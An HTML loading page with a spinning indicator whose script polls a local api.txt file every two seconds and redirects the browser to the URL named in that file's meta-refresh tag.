<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body {
           
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: sans-serif;
        }
        .spinner {
            border: 6px solid #333;
            border-top: 6px solid #09f;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <div class="spinner"></div>
        <p>Loading, please wait...</p>
    </div>
</body>
    <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
</html>